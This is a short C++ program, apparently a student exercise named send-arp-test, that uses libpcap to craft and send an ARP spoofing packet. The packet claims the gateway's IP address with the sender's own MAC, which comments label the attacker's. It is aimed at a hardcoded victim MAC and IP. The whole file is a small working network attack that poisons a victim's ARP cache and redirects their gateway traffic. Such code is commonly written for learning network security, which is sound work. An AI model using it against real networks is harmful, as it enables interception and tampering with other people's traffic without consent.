#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    // inintialize packet?
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");	// ffff(broadcast)
    packet.eth_.smac_ = Mac("08:00:27:1e:36:4a");	// my self
    packet.eth_.type_ = htons(EthHdr::Arp);

    // sender mac, sender ip?
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac("08:00:27:1e:36:4a");   // att's mac
    packet.arp_.sip_ = htonl(Ip("192.168.242.95"));// gateway
    packet.arp_.tmac_ = Mac("f0:a6:54:29:6b:91");   // Victim mac
    packet.arp_.tip_ = htonl(Ip("192.168.242.15")); // Victim ip


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}
